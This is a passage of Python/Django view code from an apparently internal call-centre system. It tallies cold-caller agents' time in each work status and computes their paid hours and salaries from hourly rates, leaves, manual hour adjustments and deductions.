                        time2 = datetime.strptime(str(current_status_started), time_format)
                        time_difference = time2 - time1
                        
                        if work_hours[past_status] == 0:
                            work_hours[past_status] = str(time_difference)
                            
                        else:
                            #total_working_before = datetime.strptime(str(work_hours[past_status]), time_format)
                            #total_working_after = datetime.strptime(str(time_difference), time_format)
                            #total_hours = total_working_before+total_working_after
                            try:
                                parts = str(time_difference).split(', ')
                                days_str = parts[0]  # Extract days part
                                time_difference = parts[1]
                            except:
                                pass
                            time_str = work_hours[past_status]  # Assuming work_hours[past_status] = '24:10:27'

                            # Split the time string into hours, minutes, and seconds
                            hours_str, minutes_str, seconds_str = time_str.split(':')

                            # Convert hours, minutes, and seconds to integers
                            hours = int(hours_str)
                            minutes = int(minutes_str)
                            seconds = int(seconds_str)

                            # Create a timedelta object
                            time_delta1 = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                            #time_delta1 = datetime.strptime(str(work_hours[past_status]), time_format) - datetime.strptime('00:00:00', time_format)
                            time_delta2 = datetime.strptime(str(time_difference), time_format) - datetime.strptime('00:00:00', time_format)

                            # Add timedelta objects together
                            total_hours = time_delta1 + time_delta2
                                    

                            work_hours[past_status] = str(total_hours)
                            
                            total_hours = (str(total_hours))
                            components = total_hours.split(', ')

                            if len(components) == 2:
                                # If the time string contains two components (days and time), parse them separately
                                days_part, time_part = components
                                days = int(days_part.split()[0])  # Extract the number of days
                            else:
                                # If the time string contains only one component (time), assume 0 days
                                time_part = components[0]
                                days = 0
                            
                            # Extract hours, minutes, and seconds from the time part
                            time_components = time_part.split(':')
                            hours = int(time_components[0])
                            minutes = int(time_components[1])
                            seconds = int(time_components[2])
                            
                            # Convert days to hours and add to the hours component
                            hours += days * 24
                            
                            # Format the time as HH:MM:SS
                            total_hours = f'{hours:02}:{minutes:02}:{seconds:02}'

                            ###############################3


                            time_components = total_hours.split(':')

                            # Extract hours, minutes, and seconds from the time part
                            hours = int(time_components[0])
                            minutes = int(time_components[1])
                            seconds = int(time_components[2])

                            # Calculate the total number of seconds
                            total_seconds = hours * 3600 + minutes * 60 + seconds

                            # Calculate hours, minutes, and seconds from total_seconds
                            hours = total_seconds // 3600
                            minutes = (total_seconds % 3600) // 60
                            seconds = total_seconds % 60

                            # Format the time as HH:MM:SS
                            formatted_time = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                            


                            work_hours[past_status] = total_hours
                    


                        past_status = current_status
                        past_status_started = current_status_started
                agents_hours[agent] = work_hours
                #ready = datetime.strptime(str(work_hours['ready']), time_format) - datetime.strptime('00:00:00', time_format)
                ready = work_hours['ready']
                break_ = work_hours['break']
                meeting = work_hours['meeting']
                afk = work_hours['afk']
                technical_issue = work_hours['technical_issue']

                #break_ = datetime.strptime(str(work_hours['break']), time_format) - datetime.strptime('00:00:00', time_format)
                #meeting =  datetime.strptime(str(work_hours['meeting']), time_format) - datetime.strptime('00:00:00', time_format)
                #afk = datetime.strptime(str(work_hours['afk']), time_format) - datetime.strptime('00:00:00', time_format)
                #technical_issue = datetime.strptime(str(work_hours['technical_issue']), time_format) - datetime.strptime('00:00:00', time_format)
                #paid_leaves =  datetime.strptime(str(work_hours['paid_leaves']), time_format) - datetime.strptime('00:00:00', time_format)
                #deductions =  datetime.strptime(str(work_hours['deductions']), time_format) - datetime.strptime('00:00:00', time_format)

                hours_str, minutes_str, seconds_str = str(ready).split(':')

                # Convert hours, minutes, and seconds to integers
                hours = int(hours_str)
                minutes = int(minutes_str)
                seconds = int(seconds_str)

                # Create a timedelta object
                ready = timedelta(hours=hours, minutes=minutes, seconds=seconds)

                # Add timedelta objects together
                hours_str, minutes_str, seconds_str = str(break_).split(':')

                # Convert hours, minutes, and seconds to integers
                hours = int(hours_str)
                minutes = int(minutes_str)
                seconds = int(seconds_str)

                # Create a timedelta object
                break_ = timedelta(hours=hours, minutes=minutes, seconds=seconds)


                # Add timedelta objects together
                hours_str, minutes_str, seconds_str = str(meeting).split(':')

                # Convert hours, minutes, and seconds to integers
                hours = int(hours_str)
                minutes = int(minutes_str)
                seconds = int(seconds_str)

                # Create a timedelta object
                meeting = timedelta(hours=hours, minutes=minutes, seconds=seconds)


                # Add timedelta objects together
                hours_str, minutes_str, seconds_str = str(afk).split(':')

                # Convert hours, minutes, and seconds to integers
                hours = int(hours_str)
                minutes = int(minutes_str)
                seconds = int(seconds_str)

                # Create a timedelta object
                afk = timedelta(hours=hours, minutes=minutes, seconds=seconds)


                                # Add timedelta objects together
                hours_str, minutes_str, seconds_str = str(technical_issue).split(':')

                # Convert hours, minutes, and seconds to integers
                hours = int(hours_str)
                minutes = int(minutes_str)
                seconds = int(seconds_str)

                # Create a timedelta object
                technical_issue = timedelta(hours=hours, minutes=minutes, seconds=seconds)



                                # Add timedelta objects together
                hours_str, minutes_str, seconds_str = str(technical_issue).split(':')

                # Convert hours, minutes, and seconds to integers
                hours = int(hours_str)
                minutes = int(minutes_str)
                seconds = int(seconds_str)

                # Create a timedelta object
                technical_issue = timedelta(hours=hours, minutes=minutes, seconds=seconds)





                work_hours['total_hours'] = ready + break_ + meeting + afk + technical_issue
                work_hours['total_paid_hours'] = ready + meeting 
                
                work_hours['total_hours'] = formating_hours(work_hours['total_hours'])
                work_hours['total_paid_hours'] = formating_hours(work_hours['total_paid_hours'])

                # Add timedelta objects together
                hours, minutes, seconds = map(int, str(work_hours["total_paid_hours"]).split(':'))
            
                # Calculate total hours worked (including fractional hours for minutes and seconds)





            affiliates = AffiliateUser.objects.filter(active=True)
            context = { 
                        'affiliates':affiliates,
                        'teams': teams,
                        'requestprofile':requestprofile,
                        'notifications':notifications,
                        'messages':messages,
                        'permissions':permissions,
                        'agents_hours':agents_hours,
                        'work_status':work_status,
                        }
                
            return render(request, "agents/agents_hours_searched.html", context)



        
        elif 'search_id' in request.POST:
            
            data = request.POST
            start_date=data.get('start_date') 
            end_date=data.get('end_date') 
            agent_id = data.get('agent_id')

            agent = Profile.objects.get(active=True, userid=agent_id)
            agents_hours = []

            start_date = datetime.strptime(start_date, '%Y-%m-%d').date()
            end_date = datetime.strptime(end_date, '%Y-%m-%d').date()
            current_date = start_date


            #print(agents_hours)
            date = datetime.now(timezone('US/Eastern')).date()
            time = datetime.now(timezone('US/Eastern')).time()

            while current_date <= end_date:
                if current_date > date:
                    break
                hours = WorkStatus.objects.filter(active=True,date=current_date,profile=agent)


                #work_statuses = [Ready, Break , Meeting , AFK , Technical Issue , End Shift ]
                work_hours = {
                        'agent':agent,
                        'date':None,
                        'logged_in':"00:00:00",
                        'ready':"00:00:00",
                        'break':"00:00:00",
                        'meeting':"00:00:00",
                        'afk':"00:00:00",
                        'technical_issue':"00:00:00",
                        'end_shift':"00:00:00",
                        'logged_out':"00:00:00",
                        'total_hours':"00:00:00",
                        'total_paid_hours':"00:00:00",
                        }
                
                logged_in = WorkStatus.objects.filter(active=True,date=current_date,profile=agent).first()
                   
                logged_out = WorkStatus.objects.filter(active=True,date=current_date,profile=agent,status="end_shift").last()
                work_hours['logged_in'] = logged_in
                work_hours['logged_out'] = logged_out
                work_hours['date'] = current_date
                time_format = '%H:%M:%S'
                
                past_status = 0
                past_status_started = 0
                for hour in hours:
                    if past_status_started == 0:
                        past_status = str(hour.status)
                        past_status_started = str(hour.time.strftime("%H:%M:%S"))
                    elif past_status_started !=0 :
                        current_status = hour.status
                        current_status_started = (hour.time).strftime("%H:%M:%S")
                        
                        time1 = datetime.strptime(str(past_status_started), time_format)
                        time2 = datetime.strptime(str(current_status_started), time_format)
                        time_difference = time2 - time1
                        
                        if work_hours[past_status] == 0:
                            work_hours[past_status] = str(time_difference)
                            
                        else:
                            #total_working_before = datetime.strptime(str(work_hours[past_status]), time_format)
                            #total_working_after = datetime.strptime(str(time_difference), time_format)
                            #total_hours = total_working_before+total_working_after
                            try:
                                parts = str(time_difference).split(', ')
                                days_str = parts[0]  # Extract days part
                                time_difference = parts[1]
                            except:
                                pass
                            
                            time_str = work_hours[past_status]  # Assuming work_hours[past_status] = '24:10:27'

                            # Split the time string into hours, minutes, and seconds
                            hours_str, minutes_str, seconds_str = time_str.split(':')

                            # Convert hours, minutes, and seconds to integers
                            hours = int(hours_str)
                            minutes = int(minutes_str)
                            seconds = int(seconds_str)

                            # Create a timedelta object
                            time_delta1 = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                            #time_delta1 = datetime.strptime(str(work_hours[past_status]), time_format) - datetime.strptime('00:00:00', time_format)
                            time_delta2 = datetime.strptime(str(time_difference), time_format) - datetime.strptime('00:00:00', time_format)

                            # Add timedelta objects together
                            total_hours = time_delta1 + time_delta2
                            

                            work_hours[past_status] = str(total_hours)

                        past_status = current_status
                        past_status_started = current_status_started
                current_date += timedelta(days=1)
                agents_hours.append(work_hours)
                ready = datetime.strptime(str(work_hours['ready']), time_format) - datetime.strptime('00:00:00', time_format)
                break_ = datetime.strptime(str(work_hours['break']), time_format) - datetime.strptime('00:00:00', time_format)
                meeting =  datetime.strptime(str(work_hours['meeting']), time_format) - datetime.strptime('00:00:00', time_format)
                afk = datetime.strptime(str(work_hours['afk']), time_format) - datetime.strptime('00:00:00', time_format)
                technical_issue = datetime.strptime(str(work_hours['technical_issue']), time_format) - datetime.strptime('00:00:00', time_format)
                # Add timedelta objects together
                work_hours['total_hours'] = ready + break_ + meeting + afk + technical_issue
                work_hours['total_paid_hours'] = ready + meeting

                





            affiliates = AffiliateUser.objects.filter(active=True)
            context = { 
                        'affiliates':affiliates,
                        'teams': teams,
                        'requestprofile':requestprofile,
                        'notifications':notifications,
                        'messages':messages,
                        'permissions':permissions,
                        'agents_hours':agents_hours,
                        'work_status':work_status,
                        }
                
            return render(request, "agents/agents_hours_searched_agent.html", context)

    
    return render(request, "agents/agents_hours_search.html", context)


@login_required(login_url="/login")
def agents_salaries(request):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_salaries:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)


    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    

    agents = Profile.objects.filter(active=True, role__in=["coldcaller",])
    agents_hours = {}

    #print(agents_hours)
    date = datetime.now(timezone('US/Eastern')).date()
    time = datetime.now(timezone('US/Eastern')).time()

    datem = int(date.strftime("%m"))
    datey = int(date.strftime("%Y"))

 

    
    for agent in agents:
        hours = WorkStatus.objects.filter(active=True,date__month=datem, date__year=datey, profile=agent)
        
        #work_statuses = [Ready, Break , Meeting , AFK , Technical Issue , End Shift ]
        work_hours = {
                'logged_in':"00:00:00",
                'ready':"00:00:00",
                'break':"00:00:00",
                'meeting':"00:00:00",
                'afk':"00:00:00",
                'technical_issue':"00:00:00",
                'end_shift':"00:00:00",
                'logged_out':"00:00:00",
                'total_hours':"00:00:00",
                'total_paid_hours':"00:00:00",
                'paid_leaves':"00:00:00",
                'deductions':"00:00:00",
                'salary':0,
                }
        deductions = Action.objects.filter(agent=agent.user,action_type="deduction",status="approved",active=True, submission_date__month=datem,  submission_date__year=datey)
        ded_total = 0
        for ded in deductions:
            if type(ded.deduction_amount) == int:
                ded_total +=ded.deduction_amount

         # Replace this with your actual total deduction time in hours

        # Parse the initial time string
        total_seconds = ded_total * 3600
        minutes, seconds = divmod(total_seconds, 60)
        hours_, minutes = divmod(minutes, 60)
        
        # Format the time as HH:MM:SS
        formatted_time = f"{hours_:02}:{minutes:02}:{seconds:02}"

        # Update the deductions in work_hours dictionary
        work_hours['deductions'] = formatted_time
        
        deducted_hours = ManualHours.objects.filter(agent_user=agent.user,positive=False,active=True, date__month=datem, date__year=datey)
        ded_hours_total = 0
        for ded in deducted_hours:
            if type(ded.hours) == int:
                ded_hours_total +=ded.hours

         # Replace this with your actual total deduction time in hours

        # Parse the initial time string
        total_seconds = ded_hours_total * 3600
        minutes, seconds = divmod(total_seconds, 60)
        hours_, minutes = divmod(minutes, 60)
        
        # Format the time as HH:MM:SS
        formatted_time = f"{hours_:02}:{minutes:02}:{seconds:02}"

        # Update the deductions in work_hours dictionary
        work_hours['deducted_hours'] = formatted_time
        
        added_hours = ManualHours.objects.filter(agent_user=agent.user,positive=True,active=True, date__month=datem, date__year=datey)
        added_hours_total = 0
        for hr in added_hours:
            if type(hr.hours) == int:
                added_hours_total +=hr.hours

         # Replace this with your actual total deduction time in hours

        # Parse the initial time string
        total_seconds = added_hours_total * 3600
        minutes, seconds = divmod(total_seconds, 60)
        hours_, minutes = divmod(minutes, 60)
        
        # Format the time as HH:MM:SS
        formatted_time = f"{hours_:02}:{minutes:02}:{seconds:02}"

        # Update the deductions in work_hours dictionary
        work_hours['added_hours'] = formatted_time
        

        leavesupl = len(Leave.objects.filter(agent=agent.user,leave_type="upl",status="approved",active=True, requested_date__month=datem,requested_date__year=datey))
        leavesall = len(Leave.objects.filter(agent=agent.user,status="approved",active=True, requested_date__month=datem,requested_date__year=datey))
        
        leaves = leavesall-leavesupl

        initial_time = datetime.strptime(work_hours['paid_leaves'], '%H:%M:%S').time()

        # Specify the number of hours to add
        hours_to_add = leaves*8

        total_seconds = hours_to_add * 3600
        minutes, seconds = divmod(total_seconds, 60)
        hours_, minutes = divmod(minutes, 60)
        
        # Format the time as HH:MM:SS
        formatted_time = f"{hours_:02}:{minutes:02}:{seconds:02}"



        # Format the new time as a string
        work_hours['paid_leaves'] = formatted_time      
        
        logged_in = WorkStatus.objects.filter(active=True,date=date,profile=agent).first()
        logged_out = WorkStatus.objects.filter(active=True,date=date,profile=agent,status="end_shift").last()
        work_hours['logged_in'] = logged_in
        work_hours['logged_out'] = logged_out 
        time_format = '%H:%M:%S'
        
        past_status = 0
        past_status_started = 0
        for hour in hours:
            if past_status_started == 0:
                past_status = str(hour.status)
                past_status_started = str(hour.time.strftime("%H:%M:%S"))
            elif past_status_started !=0 :
                current_status = hour.status
                current_status_started = (hour.time).strftime("%H:%M:%S")
                
                time1 = datetime.strptime(str(past_status_started), time_format)
                time2 = datetime.strptime(str(current_status_started), time_format)
                time_difference = time2 - time1
                
                if work_hours[past_status] == 0:
                    work_hours[past_status] = str(time_difference)
                    
                else:
                    #total_working_before = datetime.strptime(str(work_hours[past_status]), time_format)
                    #total_working_after = datetime.strptime(str(time_difference), time_format)
                    #total_hours = total_working_before+total_working_after
                    try:
                        parts = str(time_difference).split(', ')
                        days_str = parts[0]  # Extract days part
                        time_difference = parts[1]      
                    except:
                        pass
                    """
                    hours_str, minutes_str, seconds_str = str(work_hours[past_status]).split(':')

                    # Convert hours, minutes, and seconds to integers
                    hours = int(hours_str)
                    minutes = int(minutes_str)
                    seconds = int(seconds_str)
                    work_hours[past_status] = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                    
                    work_hours['total_hours'] = formating_hours(work_hours['total_hours'])
                    """

                    time_str = work_hours[past_status]  # Assuming work_hours[past_status] = '24:10:27'

                    # Split the time string into hours, minutes, and seconds
                    hours_str, minutes_str, seconds_str = time_str.split(':')

                    # Convert hours, minutes, and seconds to integers
                    hours = int(hours_str)
                    minutes = int(minutes_str)
                    seconds = int(seconds_str)

                    # Create a timedelta object
                    time_delta1 = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                    #time_delta1 = datetime.strptime(str(work_hours[past_status]), time_format) - datetime.strptime('00:00:00', time_format)
                    time_delta2 = datetime.strptime(str(time_difference), time_format) - datetime.strptime('00:00:00', time_format)

                    # Add timedelta objects together
                    total_hours = time_delta1 + time_delta2
                            

                    work_hours[past_status] = str(total_hours)
                    
                    total_hours = (str(total_hours))
                    components = total_hours.split(', ')

                    if len(components) == 2:
                        # If the time string contains two components (days and time), parse them separately
                        days_part, time_part = components
                        days = int(days_part.split()[0])  # Extract the number of days
                    else:
                        # If the time string contains only one component (time), assume 0 days
                        time_part = components[0]
                        days = 0
                    
                    # Extract hours, minutes, and seconds from the time part
                    time_components = time_part.split(':')
                    hours = int(time_components[0])
                    minutes = int(time_components[1])
                    seconds = int(time_components[2])
                    
                    # Convert days to hours and add to the hours component
                    hours += days * 24
                    
                    # Format the time as HH:MM:SS
                    total_hours = f'{hours:02}:{minutes:02}:{seconds:02}'

                    ###############################3


                    time_components = total_hours.split(':')

                    # Extract hours, minutes, and seconds from the time part
                    hours = int(time_components[0])
                    minutes = int(time_components[1])
                    seconds = int(time_components[2])

                    # Calculate the total number of seconds
                    total_seconds = hours * 3600 + minutes * 60 + seconds

                    # Calculate hours, minutes, and seconds from total_seconds
                    hours = total_seconds // 3600
                    minutes = (total_seconds % 3600) // 60
                    seconds = total_seconds % 60

                    # Format the time as HH:MM:SS
                    formatted_time = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                    


                    work_hours[past_status] = total_hours
            


                past_status = current_status
                past_status_started = current_status_started
        agents_hours[agent] = work_hours
        #ready = datetime.strptime(str(work_hours['ready']), time_format) - datetime.strptime('00:00:00', time_format)
        ready = work_hours['ready']
        break_ = work_hours['break']
        meeting = work_hours['meeting']
        afk = work_hours['afk']
        technical_issue = work_hours['technical_issue']
        paid_leaves = work_hours['paid_leaves']
        deductions = work_hours['deductions']
        deducted_hours = work_hours['deducted_hours']
        added_hours = work_hours['added_hours']
        #break_ = datetime.strptime(str(work_hours['break']), time_format) - datetime.strptime('00:00:00', time_format)
        #meeting =  datetime.strptime(str(work_hours['meeting']), time_format) - datetime.strptime('00:00:00', time_format)
        #afk = datetime.strptime(str(work_hours['afk']), time_format) - datetime.strptime('00:00:00', time_format)
        #technical_issue = datetime.strptime(str(work_hours['technical_issue']), time_format) - datetime.strptime('00:00:00', time_format)
        #paid_leaves =  datetime.strptime(str(work_hours['paid_leaves']), time_format) - datetime.strptime('00:00:00', time_format)
        #deductions =  datetime.strptime(str(work_hours['deductions']), time_format) - datetime.strptime('00:00:00', time_format)

        hours_str, minutes_str, seconds_str = str(ready).split(':')

        # Convert hours, minutes, and seconds to integers
        hours = int(hours_str)
        minutes = int(minutes_str)
        seconds = int(seconds_str)

        # Create a timedelta object
        ready = timedelta(hours=hours, minutes=minutes, seconds=seconds)

        # Add timedelta objects together
        hours_str, minutes_str, seconds_str = str(break_).split(':')

        # Convert hours, minutes, and seconds to integers
        hours = int(hours_str)
        minutes = int(minutes_str)
        seconds = int(seconds_str)

        # Create a timedelta object
        break_ = timedelta(hours=hours, minutes=minutes, seconds=seconds)


        # Add timedelta objects together
        hours_str, minutes_str, seconds_str = str(meeting).split(':')

        # Convert hours, minutes, and seconds to integers
        hours = int(hours_str)
        minutes = int(minutes_str)
        seconds = int(seconds_str)

        # Create a timedelta object
        meeting = timedelta(hours=hours, minutes=minutes, seconds=seconds)


        # Add timedelta objects together
        hours_str, minutes_str, seconds_str = str(afk).split(':')

        # Convert hours, minutes, and seconds to integers
        hours = int(hours_str)
        minutes = int(minutes_str)
        seconds = int(seconds_str)

        # Create a timedelta object
        afk = timedelta(hours=hours, minutes=minutes, seconds=seconds)


                        # Add timedelta objects together
        hours_str, minutes_str, seconds_str = str(technical_issue).split(':')

        # Convert hours, minutes, and seconds to integers
        hours = int(hours_str)
        minutes = int(minutes_str)
        seconds = int(seconds_str)

        # Create a timedelta object
        technical_issue = timedelta(hours=hours, minutes=minutes, seconds=seconds)

        # Create a timedelta object


                        # Add timedelta objects together
        hours_str, minutes_str, seconds_str = str(technical_issue).split(':')

        # Convert hours, minutes, and seconds to integers
        hours = int(hours_str)
        minutes = int(minutes_str)
        seconds = int(seconds_str)

        # Create a timedelta object
        technical_issue = timedelta(hours=hours, minutes=minutes, seconds=seconds)


        hours_str, minutes_str, seconds_str = str(paid_leaves).split(':')

        # Convert hours, minutes, and seconds to integers
        hours = int(hours_str)
        minutes = int(minutes_str)
        seconds = int(seconds_str)

        # Create a timedelta object
        paid_leaves = timedelta(hours=hours, minutes=minutes, seconds=seconds)

        hours_str, minutes_str, seconds_str = str(deductions).split(':')

        # Convert hours, minutes, and seconds to integers
        hours = int(hours_str)
        minutes = int(minutes_str)
        seconds = int(seconds_str)

        # Create a timedelta object
        deductions = timedelta(hours=hours, minutes=minutes, seconds=seconds)

        hours_str, minutes_str, seconds_str = str(deducted_hours).split(':')

        # Convert hours, minutes, and seconds to integers
        hours = int(hours_str)
        minutes = int(minutes_str)
        seconds = int(seconds_str)

        # Create a timedelta object
        deducted_hours = timedelta(hours=hours, minutes=minutes, seconds=seconds)


        hours_str, minutes_str, seconds_str = str(added_hours).split(':')

        # Convert hours, minutes, and seconds to integers
        hours = int(hours_str)
        minutes = int(minutes_str)
        seconds = int(seconds_str)

        # Create a timedelta object
        added_hours = timedelta(hours=hours, minutes=minutes, seconds=seconds)






        work_hours['total_hours'] = ready + break_ + meeting + afk + technical_issue
        work_hours['total_paid_hours'] = ready + meeting + paid_leaves + added_hours - deductions - deducted_hours
        
        work_hours['total_hours'] = formating_hours(work_hours['total_hours'])
        work_hours['total_paid_hours'] = formating_hours(work_hours['total_paid_hours'])

        # Add timedelta objects together
        hours, minutes, seconds = map(int, str(work_hours["total_paid_hours"]).split(':'))
    
        # Calculate total hours worked (including fractional hours for minutes and seconds)
        total_hours_worked = hours + (minutes / 60) + (seconds / 3600)
        
        # Define the hourly rate (e.g., $2 per hour)
        hourly_rate = agent.hourly_rate
        
        # Calculate the payment for the working time
        
        payment = total_hours_worked * hourly_rate
        



        work_hours['salary'] = payment

        
 






    affiliates = AffiliateUser.objects.filter(active=True)
    context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'agents_hours':agents_hours,
                'work_status':work_status,
                }
        
    return render(request, "agents/agents_salaries.html", context)    




@login_required(login_url="/login")
def agents_salaries_search(request):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_salaries:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)


    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    

    agents = Profile.objects.filter(active=True, role__in=["coldcaller",])
    agents_hours = {}

    #print(agents_hours)
    date = datetime.now(timezone('US/Eastern')).date()
    time = datetime.now(timezone('US/Eastern')).time()

    datem = int(date.strftime("%m"))
    if request.method == "POST":
        data = request.POST
        start_date=data.get('start_date') 
        end_date=data.get('end_date') 



        agents = Profile.objects.filter(active=True, role="coldcaller")
        agents_hours = {}

        #print(agents_hours)
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()



    
        for agent in agents:
            hours = WorkStatus.objects.filter(active=True,date__range=[start_date,end_date],profile=agent)
            
            #work_statuses = [Ready, Break , Meeting , AFK , Technical Issue , End Shift ]
            work_hours = {
                    'logged_in':"00:00:00",
                    'ready':"00:00:00",
                    'break':"00:00:00",
                    'meeting':"00:00:00",
                    'afk':"00:00:00",
                    'technical_issue':"00:00:00",
                    'end_shift':"00:00:00",
                    'logged_out':"00:00:00",
                    'total_hours':"00:00:00",
                    'total_paid_hours':"00:00:00",
                    'paid_leaves':"00:00:00",
                    'deductions':"00:00:00",
                    'salary':0,
                    }
            deductions = Action.objects.filter(agent=agent.user,action_type="deduction",status="approved",active=True, submission_date__range=[start_date,end_date])
            ded_total = 0
            for ded in deductions:
                if type(ded.deduction_amount) == int:
                    ded_total +=ded.deduction_amount

            # Replace this with your actual total deduction time in hours

            # Parse the initial time string
            total_seconds = ded_total * 3600
            minutes, seconds = divmod(total_seconds, 60)
            hours_, minutes = divmod(minutes, 60)
            
            # Format the time as HH:MM:SS
            formatted_time = f"{hours_:02}:{minutes:02}:{seconds:02}"

            # Update the deductions in work_hours dictionary
            work_hours['deductions'] = formatted_time

            deducted_hours = ManualHours.objects.filter(agent_user=agent.user,positive=False,active=True, date__range=[start_date,end_date])
            ded_hours_total = 0
            for ded in deducted_hours:
                if type(ded.hours) == int:
                    ded_hours_total +=ded.hours

            # Replace this with your actual total deduction time in hours

            # Parse the initial time string
            total_seconds = ded_hours_total * 3600
            minutes, seconds = divmod(total_seconds, 60)
            hours_, minutes = divmod(minutes, 60)
            
            # Format the time as HH:MM:SS
            formatted_time = f"{hours_:02}:{minutes:02}:{seconds:02}"

            # Update the deductions in work_hours dictionary
            work_hours['deducted_hours'] = formatted_time
            
            added_hours = ManualHours.objects.filter(agent_user=agent.user,positive=True,active=True, date__range=[start_date,end_date])
            added_hours_total = 0
            for hr in added_hours:
                if type(hr.hours) == int:
                    added_hours_total +=hr.hours

            # Replace this with your actual total deduction time in hours

            # Parse the initial time string
            total_seconds = added_hours_total * 3600
            minutes, seconds = divmod(total_seconds, 60)
            hours_, minutes = divmod(minutes, 60)
            
            # Format the time as HH:MM:SS
            formatted_time = f"{hours_:02}:{minutes:02}:{seconds:02}"

            # Update the deductions in work_hours dictionary
            work_hours['added_hours'] = formatted_time


            leavesupl = len(Leave.objects.filter(agent=agent.user,leave_type="upl",status="approved",active=True, requested_date__range=[start_date,end_date]))
            leavesall = len(Leave.objects.filter(agent=agent.user,status="approved",active=True, requested_date__range=[start_date,end_date]))
            
            leaves = leavesall-leavesupl
            initial_time = datetime.strptime(work_hours['paid_leaves'], '%H:%M:%S').time()

            # Specify the number of hours to add
            hours_to_add = leaves*8

            total_seconds = hours_to_add * 3600
            minutes, seconds = divmod(total_seconds, 60)
            hours_, minutes = divmod(minutes, 60)
            
            # Format the time as HH:MM:SS
            formatted_time = f"{hours_:02}:{minutes:02}:{seconds:02}"



            # Format the new time as a string
            work_hours['paid_leaves'] = formatted_time      
            
            logged_in = WorkStatus.objects.filter(active=True,date=date,profile=agent).first()
            logged_out = WorkStatus.objects.filter(active=True,date=date,profile=agent,status="end_shift").last()
            work_hours['logged_in'] = logged_in
            work_hours['logged_out'] = logged_out 
            time_format = '%H:%M:%S'
            
            past_status = 0
            past_status_started = 0
            for hour in hours:
                if past_status_started == 0:
                    past_status = str(hour.status)
                    past_status_started = str(hour.time.strftime("%H:%M:%S"))
                elif past_status_started !=0 :
                    current_status = hour.status
                    current_status_started = (hour.time).strftime("%H:%M:%S")
                    
                    time1 = datetime.strptime(str(past_status_started), time_format)
                    time2 = datetime.strptime(str(current_status_started), time_format)
                    time_difference = time2 - time1
                    
                    if work_hours[past_status] == 0:
                        work_hours[past_status] = str(time_difference)
                        
                    else:
                        #total_working_before = datetime.strptime(str(work_hours[past_status]), time_format)
                        #total_working_after = datetime.strptime(str(time_difference), time_format)
                        #total_hours = total_working_before+total_working_after
                        try:
                            parts = str(time_difference).split(', ')
                            days_str = parts[0]  # Extract days part
                            time_difference = parts[1]
                        except:
                            pass
                        time_str = work_hours[past_status]  # Assuming work_hours[past_status] = '24:10:27'

                        # Split the time string into hours, minutes, and seconds
                        hours_str, minutes_str, seconds_str = time_str.split(':')

                        # Convert hours, minutes, and seconds to integers
                        hours = int(hours_str)
                        minutes = int(minutes_str)
                        seconds = int(seconds_str)

                        # Create a timedelta object
                        time_delta1 = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                        
                        #time_delta1 = datetime.strptime(str(work_hours[past_status]), time_format) - datetime.strptime('00:00:00', time_format)
                        
                        time_delta2 = datetime.strptime(str(time_difference), time_format) - datetime.strptime('00:00:00', time_format)

                        # Add timedelta objects together
                        total_hours = time_delta1 + time_delta2
                                

                        work_hours[past_status] = str(total_hours)
                        
                        total_hours = (str(total_hours))
                        components = total_hours.split(', ')

                        if len(components) == 2:
                            # If the time string contains two components (days and time), parse them separately
                            days_part, time_part = components
                            days = int(days_part.split()[0])  # Extract the number of days
                        else:
                            # If the time string contains only one component (time), assume 0 days
                            time_part = components[0]
                            days = 0
                        
                        # Extract hours, minutes, and seconds from the time part
                        time_components = time_part.split(':')
                        hours = int(time_components[0])
                        minutes = int(time_components[1])
                        seconds = int(time_components[2])
                        
                        # Convert days to hours and add to the hours component
                        hours += days * 24
                        
                        # Format the time as HH:MM:SS
                        total_hours = f'{hours:02}:{minutes:02}:{seconds:02}'

                        ###############################3


                        time_components = total_hours.split(':')

                        # Extract hours, minutes, and seconds from the time part
                        hours = int(time_components[0])
                        minutes = int(time_components[1])
                        seconds = int(time_components[2])

                        # Calculate the total number of seconds
                        total_seconds = hours * 3600 + minutes * 60 + seconds

                        # Calculate hours, minutes, and seconds from total_seconds
                        hours = total_seconds // 3600
                        minutes = (total_seconds % 3600) // 60
                        seconds = total_seconds % 60

                        # Format the time as HH:MM:SS
                        formatted_time = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                        


                        work_hours[past_status] = total_hours
                


                    past_status = current_status
                    past_status_started = current_status_started
            agents_hours[agent] = work_hours
            #ready = datetime.strptime(str(work_hours['ready']), time_format) - datetime.strptime('00:00:00', time_format)
            ready = work_hours['ready']
            break_ = work_hours['break']
            meeting = work_hours['meeting']
            afk = work_hours['afk']
            technical_issue = work_hours['technical_issue']
            paid_leaves = work_hours['paid_leaves']
            deductions = work_hours['deductions']
            deducted_hours = work_hours['deducted_hours']
            added_hours = work_hours['added_hours']
            #break_ = datetime.strptime(str(work_hours['break']), time_format) - datetime.strptime('00:00:00', time_format)
